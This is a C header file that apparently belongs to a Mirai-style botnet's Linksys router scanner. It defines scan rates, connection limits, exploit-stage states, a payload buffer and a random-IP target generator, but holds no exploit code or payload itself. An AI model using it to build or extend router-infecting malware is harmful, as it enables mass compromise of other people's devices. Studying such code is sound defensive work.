#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define linksysscanner2_SCANNER_MAX_CONNS 512
#define linksysscanner2_SCANNER_RAW_PPS 1440
#else
#define linksysscanner2_SCANNER_MAX_CONNS 256
#define linksysscanner2_SCANNER_RAW_PPS 1024
#endif

#ifdef X86_64
#define linksysscanner2_SCANNER_RDBUF_SIZE 1024
#define linksysscanner2_SCANNER_HACK_DRAIN 64
#else
#define linksysscanner2_SCANNER_RDBUF_SIZE 1024
#define linksysscanner2_SCANNER_HACK_DRAIN 64
#endif

struct linksysscanner2_scanner_connection
{
    int fd, last_recv;
    enum
    {
        linksysscanner2_SC_CLOSED,
        linksysscanner2_SC_CONNECTING,
        linksysscanner2_SC_EXPLOIT_STAGE2,
        linksysscanner2_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[linksysscanner2_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};

void linksysscanner2_scanner_init();
void linksysscanner2_scanner_kill(void);

static void linksysscanner2_setup_connection(struct linksysscanner2_scanner_connection *);
static ipv4_t linksysscanner2_get_random_ip(void);


